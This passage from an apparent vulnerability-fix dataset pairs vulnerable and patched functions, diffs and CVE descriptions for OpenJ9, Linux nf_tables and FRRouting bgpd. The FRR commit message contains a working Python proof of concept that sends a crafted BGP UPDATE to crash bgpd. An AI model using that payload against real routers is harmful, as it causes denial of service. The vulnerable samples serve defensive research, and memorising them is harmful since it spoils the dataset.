	DetachCurrentThread((JavaVM *)vm);

	return 0;
}","static UDATA
predefinedHandlerWrapper(struct J9PortLibrary *VAR_0, U_32 VAR_1, void *VAR_2, void *VAR_3)
{
	J9JavaVM *VAR_4 = (J9JavaVM *)VAR_3;
	J9JavaVMAttachArgs VAR_5 = {0};
	J9VMThread *VAR_6 = NULL;
	IDATA VAR_7 = VAR_8;
	BOOLEAN VAR_9 = TRUE;
	I_32 VAR_10 = 0;
	U_32 VAR_11 = 0;
	PORT_ACCESS_FROM_JAVAVM(VAR_4);

	VAR_10 = j9sig_map_portlib_signal_to_os_signal(VAR_1);
	/* COMMENT_0 */
	if ((VAR_10 <= 0) || J9_ARE_ANY_BITS_SET(VAR_4->sigFlags, VAR_12)) {
		return 1;
	}

	/* COMMENT_1 */
	issueReadBarrier();
	VAR_11 = VAR_4->runtimeFlags;
	if (J9_ARE_NO_BITS_SET(VAR_11, VAR_13)
	|| J9_ARE_ANY_BITS_SET(VAR_11, VAR_14)
	) {
		VAR_9 = FALSE;
	}

	if (!VAR_9) {
		return 1;
	}

	VAR_5.version = VAR_15;
	VAR_5.name = ""JVM Signal Thread"";
	VAR_5.group = VAR_4->systemThreadGroupRef;

	/* COMMENT_2 */
	VAR_7 = internalAttachCurrentThread(VAR_4, &VAR_6, &VAR_5,
				VAR_16 | VAR_17 | VAR_18,
				omrthread_self());

	if (VAR_19 != VAR_7) {
		/* COMMENT_3 */
		return 1;
	}

	/* COMMENT_4 */
	signalDispatch(VAR_6, VAR_10);

	DetachCurrentThread((JavaVM *)VAR_4);

	return 0;
}",eclipse-openj9/openj9/d4dfa6c62270ea34fcc859355a66bc25b8175237/jvminit.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -5,8 +5,9 @@
 	J9JavaVMAttachArgs attachArgs = {0};
 	J9VMThread *vmThread = NULL;
 	IDATA result = JNI_ERR;
-	BOOLEAN shutdownStarted = FALSE;
+	BOOLEAN invokeHandler = TRUE;
 	I_32 signal = 0;
+	U_32 runtimeFlags = 0;
 	PORT_ACCESS_FROM_JAVAVM(vm);
 
 	signal = j9sig_map_portlib_signal_to_os_signal(gpType);
@@ -15,14 +16,16 @@
 		return 1;
 	}
 
-	/* Don't invoke handler if JVM exit has started. */
-	omrthread_monitor_enter(vm->runtimeFlagsMutex);
-	if (J9_ARE_ANY_BITS_SET(vm->runtimeFlags, J9_RUNTIME_EXIT_STARTED)) {
-		shutdownStarted = TRUE;
+	/* Don't invoke handler if JVM hasn't initialized or JVM exit has started. */
+	issueReadBarrier();
+	runtimeFlags = vm->runtimeFlags;
+	if (J9_ARE_NO_BITS_SET(runtimeFlags, J9_RUNTIME_INITIALIZED)
+	|| J9_ARE_ANY_BITS_SET(runtimeFlags, J9_RUNTIME_EXIT_STARTED)
+	) {
+		invokeHandler = FALSE;
 	}
-	omrthread_monitor_exit(vm->runtimeFlagsMutex);
 
-	if (shutdownStarted) {
+	if (!invokeHandler) {
 		return 1;
 	}
 ","{'deleted_lines': ['\tBOOLEAN shutdownStarted = FALSE;', ""\t/* Don't invoke handler if JVM exit has started. */"", '\tomrthread_monitor_enter(vm->runtimeFlagsMutex);', '\tif (J9_ARE_ANY_BITS_SET(vm->runtimeFlags, J9_RUNTIME_EXIT_STARTED)) {', '\t\tshutdownStarted = TRUE;', '\tomrthread_monitor_exit(vm->runtimeFlagsMutex);', '\tif (shutdownStarted) {'], 'added_lines': ['\tBOOLEAN invokeHandler = TRUE;', '\tU_32 runtimeFlags = 0;', ""\t/* Don't invoke handler if JVM hasn't initialized or JVM exit has started. */"", '\tissueReadBarrier();', '\truntimeFlags = vm->runtimeFlags;', '\tif (J9_ARE_NO_BITS_SET(runtimeFlags, J9_RUNTIME_INITIALIZED)', '\t|| J9_ARE_ANY_BITS_SET(runtimeFlags, J9_RUNTIME_EXIT_STARTED)', '\t) {', '\t\tinvokeHandler = FALSE;', '\tif (!invokeHandler) {']}",True,"In Eclipse OpenJ9 before version 0.41.0, the JVM can be forced into an infinite busy hang on a spinlock or a segmentation fault if a shutdown signal (SIGTERM, SIGINT or SIGHUP) is received before the JVM has finished initializing.
",5.9,MEDIUM,1,valid,2023-09-06T18:52:19Z,4
CVE-2023-5972,['CWE-476'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H,1,torvalds/linux,"nf_tables: fix NULL pointer dereference in nft_inner_init()

We should check whether the NFTA_INNER_NUM netlink attribute is present
before accessing it, otherwise a null pointer deference error will occur.

Call Trace:
 dump_stack_lvl+0x4f/0x90
 print_report+0x3f0/0x620
 kasan_report+0xcd/0x110
 __asan_load4+0x84/0xa0
 nft_inner_init+0x128/0x2e0
 nf_tables_newrule+0x813/0x1230
 nfnetlink_rcv_batch+0xec3/0x1170
 nfnetlink_rcv+0x1e4/0x220
 netlink_unicast+0x34e/0x4b0
 netlink_sendmsg+0x45c/0x7e0
 __sys_sendto+0x355/0x370
 __x64_sys_sendto+0x84/0xa0
 do_syscall_64+0x3f/0x90
 entry_SYSCALL_64_after_hwframe+0x6e/0xd8

Fixes: 3a07327d10a0 (""netfilter: nft_inner: support for inner tunnel header matching"")
Signed-off-by: Xingyuan Mo <hdthky0@gmail.com>
Signed-off-by: Florian Westphal <fw@strlen.de>",52177bbf19e6e9398375a148d2e13ed492b40b80,https://github.com/torvalds/linux/commit/52177bbf19e6e9398375a148d2e13ed492b40b80,net/netfilter/nft_inner.c,nft_inner_init,"static int nft_inner_init(const struct nft_ctx *ctx,
const struct nft_expr *expr,
const struct nlattr * const tb[])
{
struct nft_inner *priv = nft_expr_priv(expr);
u32 flags, hdrsize, type, num;
struct nft_expr_info expr_info;
int err;
if (!tb[NFTA_INNER_FLAGS] ||
!tb[NFTA_INNER_HDRSIZE] ||
!tb[NFTA_INNER_TYPE] ||
!tb[NFTA_INNER_EXPR])
return -EINVAL;
flags = ntohl(nla_get_be32(tb[NFTA_INNER_FLAGS]));
if (flags & ~NFT_INNER_MASK)
return -EOPNOTSUPP;
num = ntohl(nla_get_be32(tb[NFTA_INNER_NUM]));
if (num != 0)
return -EOPNOTSUPP;
hdrsize = ntohl(nla_get_be32(tb[NFTA_INNER_HDRSIZE]));
type = ntohl(nla_get_be32(tb[NFTA_INNER_TYPE]));
if (type > U8_MAX)
return -EINVAL;
if (flags & NFT_INNER_HDRSIZE) {
if (hdrsize == 0 || hdrsize > 64)
return -EOPNOTSUPP;
}
priv->flags = flags;
priv->hdrsize = hdrsize;
priv->type = type;
err = nft_expr_inner_parse(ctx, tb[NFTA_INNER_EXPR], &expr_info);
if (err < 0)
return err;
priv->expr.ops = expr_info.ops;
if (!strcmp(expr_info.ops->type->name, ""payload""))
priv->expr_type = NFT_INNER_EXPR_PAYLOAD;
else if (!strcmp(expr_info.ops->type->name, ""meta""))
priv->expr_type = NFT_INNER_EXPR_META;
else
return -EINVAL;
err = expr_info.ops->init(ctx, (struct nft_expr *)&priv->expr,
(const struct nlattr * const*)expr_info.tb);
if (err < 0)
return err;
return 0;
}","static int nft_inner_init(const struct nft_ctx *VAR_0,
const struct nft_expr *VAR_1,
const struct nlattr * const VAR_2[])
{
struct nft_inner *VAR_3 = nft_expr_priv(VAR_1);
u32 VAR_4, VAR_5, VAR_6, VAR_7;
struct nft_expr_info VAR_8;
int VAR_9;
if (!VAR_2[VAR_10] ||
!VAR_2[VAR_11] ||
!VAR_2[VAR_12] ||
!VAR_2[VAR_13])
return -VAR_14;
VAR_4 = ntohl(nla_get_be32(VAR_2[VAR_10]));
if (VAR_4 & ~VAR_15)
return -VAR_16;
VAR_7 = ntohl(nla_get_be32(VAR_2[VAR_17]));
if (VAR_7 != 0)
return -VAR_16;
VAR_5 = ntohl(nla_get_be32(VAR_2[VAR_11]));
VAR_6 = ntohl(nla_get_be32(VAR_2[VAR_12]));
if (VAR_6 > VAR_18)
return -VAR_14;
if (VAR_4 & VAR_19) {
if (VAR_5 == 0 || VAR_5 > 64)
return -VAR_16;
}
VAR_3->flags = VAR_4;
VAR_3->hdrsize = VAR_5;
VAR_3->type = VAR_6;
VAR_9 = nft_expr_inner_parse(VAR_0, VAR_2[VAR_13], &VAR_8);
if (VAR_9 < 0)
return VAR_9;
VAR_3->expr.ops = VAR_8.ops;
if (!strcmp(VAR_8.ops->type->name, ""payload""))
VAR_3->expr_type = VAR_20;
else if (!strcmp(VAR_8.ops->type->name, ""meta""))
VAR_3->expr_type = VAR_21;
else
return -VAR_14;
VAR_9 = VAR_8.ops->init(VAR_0, (struct nft_expr *)&VAR_3->expr,
(const struct nlattr * const*)VAR_8.tb);
if (VAR_9 < 0)
return VAR_9;
return 0;
}",torvalds/linux/52177bbf19e6e9398375a148d2e13ed492b40b80/nft_inner.c/vul/before/0.json,"static int nft_inner_init(const struct nft_ctx *ctx,
			  const struct nft_expr *expr,
			  const struct nlattr * const tb[])
{
	struct nft_inner *priv = nft_expr_priv(expr);
	u32 flags, hdrsize, type, num;
	struct nft_expr_info expr_info;
	int err;

	if (!tb[NFTA_INNER_FLAGS] ||
	    !tb[NFTA_INNER_NUM] ||
	    !tb[NFTA_INNER_HDRSIZE] ||
	    !tb[NFTA_INNER_TYPE] ||
	    !tb[NFTA_INNER_EXPR])
		return -EINVAL;

	flags = ntohl(nla_get_be32(tb[NFTA_INNER_FLAGS]));
	if (flags & ~NFT_INNER_MASK)
		return -EOPNOTSUPP;

	num = ntohl(nla_get_be32(tb[NFTA_INNER_NUM]));
	if (num != 0)
		return -EOPNOTSUPP;

	hdrsize = ntohl(nla_get_be32(tb[NFTA_INNER_HDRSIZE]));
	type = ntohl(nla_get_be32(tb[NFTA_INNER_TYPE]));

	if (type > U8_MAX)
		return -EINVAL;

	if (flags & NFT_INNER_HDRSIZE) {
		if (hdrsize == 0 || hdrsize > 64)
			return -EOPNOTSUPP;
	}

	priv->flags = flags;
	priv->hdrsize = hdrsize;
	priv->type = type;

	err = nft_expr_inner_parse(ctx, tb[NFTA_INNER_EXPR], &expr_info);
	if (err < 0)
		return err;

	priv->expr.ops = expr_info.ops;

	if (!strcmp(expr_info.ops->type->name, ""payload""))
		priv->expr_type = NFT_INNER_EXPR_PAYLOAD;
	else if (!strcmp(expr_info.ops->type->name, ""meta""))
		priv->expr_type = NFT_INNER_EXPR_META;
	else
		return -EINVAL;

	err = expr_info.ops->init(ctx, (struct nft_expr *)&priv->expr,
				  (const struct nlattr * const*)expr_info.tb);
	if (err < 0)
		return err;

	return 0;
}","static int nft_inner_init(const struct nft_ctx *VAR_0,
			  const struct nft_expr *VAR_1,
			  const struct nlattr * const VAR_2[])
{
	struct nft_inner *VAR_3 = nft_expr_priv(VAR_1);
	u32 VAR_4, VAR_5, VAR_6, VAR_7;
	struct nft_expr_info VAR_8;
	int VAR_9;

	if (!VAR_2[VAR_10] ||
	    !VAR_2[VAR_11] ||
	    !VAR_2[VAR_12] ||
	    !VAR_2[VAR_13] ||
	    !VAR_2[VAR_14])
		return -VAR_15;

	VAR_4 = ntohl(nla_get_be32(VAR_2[VAR_10]));
	if (VAR_4 & ~VAR_16)
		return -VAR_17;

	VAR_7 = ntohl(nla_get_be32(VAR_2[VAR_11]));
	if (VAR_7 != 0)
		return -VAR_17;

	VAR_5 = ntohl(nla_get_be32(VAR_2[VAR_12]));
	VAR_6 = ntohl(nla_get_be32(VAR_2[VAR_13]));

	if (VAR_6 > VAR_18)
		return -VAR_15;

	if (VAR_4 & VAR_19) {
		if (VAR_5 == 0 || VAR_5 > 64)
			return -VAR_17;
	}

	VAR_3->flags = VAR_4;
	VAR_3->hdrsize = VAR_5;
	VAR_3->type = VAR_6;

	VAR_9 = nft_expr_inner_parse(VAR_0, VAR_2[VAR_14], &VAR_8);
	if (VAR_9 < 0)
		return VAR_9;

	VAR_3->expr.ops = VAR_8.ops;

	if (!strcmp(VAR_8.ops->type->name, ""payload""))
		VAR_3->expr_type = VAR_20;
	else if (!strcmp(VAR_8.ops->type->name, ""meta""))
		VAR_3->expr_type = VAR_21;
	else
		return -VAR_15;

	VAR_9 = VAR_8.ops->init(VAR_0, (struct nft_expr *)&VAR_3->expr,
				  (const struct nlattr * const*)VAR_8.tb);
	if (VAR_9 < 0)
		return VAR_9;

	return 0;
}",torvalds/linux/52177bbf19e6e9398375a148d2e13ed492b40b80/nft_inner.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -8,6 +8,7 @@
 	int err;
 
 	if (!tb[NFTA_INNER_FLAGS] ||
+	    !tb[NFTA_INNER_NUM] ||
 	    !tb[NFTA_INNER_HDRSIZE] ||
 	    !tb[NFTA_INNER_TYPE] ||
 	    !tb[NFTA_INNER_EXPR])","{'deleted_lines': [], 'added_lines': ['\t    !tb[NFTA_INNER_NUM] ||']}",True,A null pointer dereference flaw was found in the nft_inner.c functionality of netfilter in the Linux kernel. This issue could allow a local user to crash the system or escalate their privileges on the system.,7.0,HIGH,2,valid,2023-10-09T10:36:14Z,4
CVE-2023-5972,['CWE-476'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H,1,torvalds/linux,"nf_tables: fix NULL pointer dereference in nft_expr_inner_parse()

We should check whether the NFTA_EXPR_NAME netlink attribute is present
before accessing it, otherwise a null pointer deference error will occur.

Call Trace:
 <TASK>
 dump_stack_lvl+0x4f/0x90
 print_report+0x3f0/0x620
 kasan_report+0xcd/0x110
 __asan_load2+0x7d/0xa0
 nla_strcmp+0x2f/0x90
 __nft_expr_type_get+0x41/0xb0
 nft_expr_inner_parse+0xe3/0x200
 nft_inner_init+0x1be/0x2e0
 nf_tables_newrule+0x813/0x1230
 nfnetlink_rcv_batch+0xec3/0x1170
 nfnetlink_rcv+0x1e4/0x220
 netlink_unicast+0x34e/0x4b0
 netlink_sendmsg+0x45c/0x7e0
 __sys_sendto+0x355/0x370
 __x64_sys_sendto+0x84/0xa0
 do_syscall_64+0x3f/0x90
 entry_SYSCALL_64_after_hwframe+0x6e/0xd8

Fixes: 3a07327d10a0 (""netfilter: nft_inner: support for inner tunnel header matching"")
Signed-off-by: Xingyuan Mo <hdthky0@gmail.com>
Signed-off-by: Florian Westphal <fw@strlen.de>",505ce0630ad5d31185695f8a29dde8d29f28faa7,https://github.com/torvalds/linux/commit/505ce0630ad5d31185695f8a29dde8d29f28faa7,net/netfilter/nf_tables_api.c,nft_expr_inner_parse,"int nft_expr_inner_parse(const struct nft_ctx *ctx, const struct nlattr *nla,
struct nft_expr_info *info)
{
struct nlattr *tb[NFTA_EXPR_MAX + 1];
const struct nft_expr_type *type;
int err;
err = nla_parse_nested_deprecated(tb, NFTA_EXPR_MAX, nla,
nft_expr_policy, NULL);
if (err < 0)
return err;
if (!tb[NFTA_EXPR_DATA])
return -EINVAL;
type = __nft_expr_type_get(ctx->family, tb[NFTA_EXPR_NAME]);
if (!type)
return -ENOENT;
if (!type->inner_ops)
return -EOPNOTSUPP;
err = nla_parse_nested_deprecated(info->tb, type->maxattr,
tb[NFTA_EXPR_DATA],
type->policy, NULL);
if (err < 0)
goto err_nla_parse;
info->attr = nla;
info->ops = type->inner_ops;
return 0;
err_nla_parse:
return err;
}","int nft_expr_inner_parse(const struct nft_ctx *VAR_0, const struct nlattr *VAR_1,
struct nft_expr_info *VAR_2)
{
struct nlattr *VAR_3[VAR_4 + 1];
const struct nft_expr_type *VAR_5;
int VAR_6;
VAR_6 = nla_parse_nested_deprecated(VAR_3, VAR_4, VAR_1,
VAR_7, NULL);
if (VAR_6 < 0)
return VAR_6;
if (!VAR_3[VAR_8])
return -VAR_9;
VAR_5 = __nft_expr_type_get(VAR_0->family, VAR_3[VAR_10]);
if (!VAR_5)
return -VAR_11;
if (!VAR_5->inner_ops)
return -VAR_12;
VAR_6 = nla_parse_nested_deprecated(VAR_2->tb, VAR_5->maxattr,
VAR_3[VAR_8],
VAR_5->policy, NULL);
if (VAR_6 < 0)
goto err_nla_parse;
VAR_2->attr = VAR_1;
VAR_2->ops = VAR_5->inner_ops;
return 0;
err_nla_parse:
return VAR_6;
}",torvalds/linux/505ce0630ad5d31185695f8a29dde8d29f28faa7/nf_tables_api.c/vul/before/0.json,"int nft_expr_inner_parse(const struct nft_ctx *ctx, const struct nlattr *nla,
			 struct nft_expr_info *info)
{
	struct nlattr *tb[NFTA_EXPR_MAX + 1];
	const struct nft_expr_type *type;
	int err;

	err = nla_parse_nested_deprecated(tb, NFTA_EXPR_MAX, nla,
					  nft_expr_policy, NULL);
	if (err < 0)
		return err;

	if (!tb[NFTA_EXPR_DATA] || !tb[NFTA_EXPR_NAME])
		return -EINVAL;

	type = __nft_expr_type_get(ctx->family, tb[NFTA_EXPR_NAME]);
	if (!type)
		return -ENOENT;

	if (!type->inner_ops)
		return -EOPNOTSUPP;

	err = nla_parse_nested_deprecated(info->tb, type->maxattr,
					  tb[NFTA_EXPR_DATA],
					  type->policy, NULL);
	if (err < 0)
		goto err_nla_parse;

	info->attr = nla;
	info->ops = type->inner_ops;

	return 0;

err_nla_parse:
	return err;
}","int nft_expr_inner_parse(const struct nft_ctx *VAR_0, const struct nlattr *VAR_1,
			 struct nft_expr_info *VAR_2)
{
	struct nlattr *VAR_3[VAR_4 + 1];
	const struct nft_expr_type *VAR_5;
	int VAR_6;

	VAR_6 = nla_parse_nested_deprecated(VAR_3, VAR_4, VAR_1,
					  VAR_7, NULL);
	if (VAR_6 < 0)
		return VAR_6;

	if (!VAR_3[VAR_8] || !VAR_3[VAR_9])
		return -VAR_10;

	VAR_5 = __nft_expr_type_get(VAR_0->family, VAR_3[VAR_9]);
	if (!VAR_5)
		return -VAR_11;

	if (!VAR_5->inner_ops)
		return -VAR_12;

	VAR_6 = nla_parse_nested_deprecated(VAR_2->tb, VAR_5->maxattr,
					  VAR_3[VAR_8],
					  VAR_5->policy, NULL);
	if (VAR_6 < 0)
		goto err_nla_parse;

	VAR_2->attr = VAR_1;
	VAR_2->ops = VAR_5->inner_ops;

	return 0;

err_nla_parse:
	return VAR_6;
}",torvalds/linux/505ce0630ad5d31185695f8a29dde8d29f28faa7/nf_tables_api.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -10,7 +10,7 @@
 	if (err < 0)
 		return err;
 
-	if (!tb[NFTA_EXPR_DATA])
+	if (!tb[NFTA_EXPR_DATA] || !tb[NFTA_EXPR_NAME])
 		return -EINVAL;
 
 	type = __nft_expr_type_get(ctx->family, tb[NFTA_EXPR_NAME]);","{'deleted_lines': ['\tif (!tb[NFTA_EXPR_DATA])'], 'added_lines': ['\tif (!tb[NFTA_EXPR_DATA] || !tb[NFTA_EXPR_NAME])']}",True,A null pointer dereference flaw was found in the nft_inner.c functionality of netfilter in the Linux kernel. This issue could allow a local user to crash the system or escalate their privileges on the system.,7.0,HIGH,2,valid,2023-10-09T10:36:15Z,4
CVE-2023-46753,['CWE-Other'],CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H,1,FRRouting/frr,"bgpd: Check mandatory attributes more carefully for UPDATE message

If we send a crafted BGP UPDATE message without mandatory attributes, we do
not check if the length of the path attributes is zero or not. We only check
if attr->flag is at least set or not. Imagine we send only unknown transit
attribute, then attr->flag is always 0. Also, this is true only if graceful-restart
capability is received.

A crash:

```
bgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)
bgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17
BGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...
BGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]
BGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]
BGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]
BGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]
BGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]
BGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]
BGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]
BGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]
BGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]
BGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]
BGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]
BGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]
BGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]
BGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]
```

Sending:

```
import socket
import time

OPEN = (b""\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff""
b""\xff\xff\x00\x62\x01\x04\xfd\xea\x00\x5a\x0a\x00\x00\x01\x45\x02""
b""\x06\x01\x04\x00\x01\x00\x01\x02\x02\x02\x00\x02\x02\x46\x00\x02""
b""\x06\x41\x04\x00\x00\xfd\xea\x02\x02\x06\x00\x02\x06\x45\x04\x00""
b""\x01\x01\x03\x02\x0e\x49\x0c\x0a\x64\x6f\x6e\x61\x74\x61\x73\x2d""
b""\x70\x63\x00\x02\x04\x40\x02\x00\x78\x02\x09\x47\x07\x00\x01\x01""
b""\x80\x00\x00\x00"")

KEEPALIVE = (b""\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff""
b""\xff\xff\xff\xff\xff\xff\x00\x13\x04"")

UPDATE = bytearray.fromhex(""ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000"")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.2', 179))
s.send(OPEN)
data = s.recv(1024)
s.send(KEEPALIVE)
data = s.recv(1024)
s.send(UPDATE)
data = s.recv(1024)
time.sleep(1000)
s.close()
```

Reported-by: Iggy Frankovic <iggyfran@amazon.com>
Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",d8482bf011cb2b173e85b65b4bf3d5061250cdb9,https://github.com/FRRouting/frr/commit/d8482bf011cb2b173e85b65b4bf3d5061250cdb9,bgpd/bgp_attr.c,bgp_attr_check,"static int bgp_attr_check(struct peer *peer, struct attr *attr)
{
uint8_t type = 0;
if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)
return BGP_ATTR_PARSE_PROCEED;
if ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)) &&
CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI))))
return BGP_ATTR_PARSE_PROCEED;
if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_ORIGIN)))
type = BGP_ATTR_ORIGIN;
if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_AS_PATH)))
type = BGP_ATTR_AS_PATH;
if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_NEXT_HOP))
&& !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)))
type = BGP_ATTR_NEXT_HOP;
if (peer->sort == BGP_PEER_IBGP
&& !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_LOCAL_PREF)))
type = BGP_ATTR_LOCAL_PREF;
if (type) {
flog_warn(EC_BGP_MISSING_ATTRIBUTE,
""%s Missing well-known attribute %s."", peer->host,
lookup_msg(attr_str, type, NULL));
return BGP_ATTR_PARSE_WITHDRAW;
}
return BGP_ATTR_PARSE_PROCEED;
}","static int bgp_attr_check(struct peer *peer, struct attr *attr)
{
uint8_t VAR_0 = 0;
if (CHECK_FLAG(peer->cap, VAR_1) && !attr->flag)
return VAR_2;
if ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_3)) &&
CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_4))))
return VAR_2;
if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_5)))
VAR_0 = VAR_5;
if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_6)))
VAR_0 = VAR_6;
if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_7))
&& !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_3)))
VAR_0 = VAR_7;
if (peer->sort == VAR_8
&& !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_9)))
VAR_0 = VAR_9;
if (VAR_0) {
flog_warn(VAR_10,
""%s Missing well-known attribute %s."", peer->host,
lookup_msg(VAR_11, VAR_0, NULL));
return VAR_12;
}
return VAR_2;
}",FRRouting/frr/d8482bf011cb2b173e85b65b4bf3d5061250cdb9/bgp_attr.c/vul/before/1.json,"static int bgp_attr_check(struct peer *peer, struct attr *attr,
			  bgp_size_t length)
{
	uint8_t type = 0;

	/* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled as an
	 * empty UPDATE.  */
	if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&
	    !length)
		return BGP_ATTR_PARSE_PROCEED;

	/* ""An UPDATE message that contains the MP_UNREACH_NLRI is not required
	   to carry any other path attributes."", though if MP_REACH_NLRI or NLRI
	   are present, it should.  Check for any other attribute being present
	   instead.
	 */
	if ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)) &&
	     CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI))))
		return BGP_ATTR_PARSE_PROCEED;

	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_ORIGIN)))
		type = BGP_ATTR_ORIGIN;

	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_AS_PATH)))
		type = BGP_ATTR_AS_PATH;

	/* RFC 2858 makes Next-Hop optional/ignored, if MP_REACH_NLRI is present
	 * and
	 * NLRI is empty. We can't easily check NLRI empty here though.
	 */
	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_NEXT_HOP))
	    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)))
		type = BGP_ATTR_NEXT_HOP;

	if (peer->sort == BGP_PEER_IBGP
	    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_LOCAL_PREF)))
		type = BGP_ATTR_LOCAL_PREF;

	/* If any of the well-known mandatory attributes are not present
	 * in an UPDATE message, then ""treat-as-withdraw"" MUST be used.
	 */
	if (type) {
		flog_warn(EC_BGP_MISSING_ATTRIBUTE,
			  ""%s Missing well-known attribute %s."", peer->host,
			  lookup_msg(attr_str, type, NULL));
		return BGP_ATTR_PARSE_WITHDRAW;
	}
	return BGP_ATTR_PARSE_PROCEED;
}","static int bgp_attr_check(struct peer *peer, struct attr *attr,
			  bgp_size_t VAR_0)
{
	uint8_t VAR_1 = 0;

	/* COMMENT_0 */
                     
	if (CHECK_FLAG(peer->cap, VAR_2) && !attr->flag &&
	    !VAR_0)
		return VAR_3;

	/* COMMENT_2 */
                                                                         
                                                                        
            
    
	if ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_4)) &&
	     CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_5))))
		return VAR_3;

	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_6)))
		VAR_1 = VAR_6;

	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_7)))
		VAR_1 = VAR_7;

	/* COMMENT_7 */
       
                                                                
    
	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_8))
	    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_4)))
		VAR_1 = VAR_8;

	if (peer->sort == VAR_9
	    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_10)))
		VAR_1 = VAR_10;

	/* COMMENT_11 */
                                                                
    
	if (VAR_1) {
		flog_warn(VAR_11,
			  ""%s Missing well-known attribute %s."", peer->host,
			  lookup_msg(VAR_12, VAR_1, NULL));
		return VAR_13;
	}
	return VAR_3;
}",FRRouting/frr/d8482bf011cb2b173e85b65b4bf3d5061250cdb9/bgp_attr.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -1,10 +1,12 @@
-static int bgp_attr_check(struct peer *peer, struct attr *attr)
+static int bgp_attr_check(struct peer *peer, struct attr *attr,
+			  bgp_size_t length)
 {
 	uint8_t type = 0;
 
 	/* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled as an
 	 * empty UPDATE.  */
-	if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)
+	if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&
+	    !length)
 		return BGP_ATTR_PARSE_PROCEED;
 
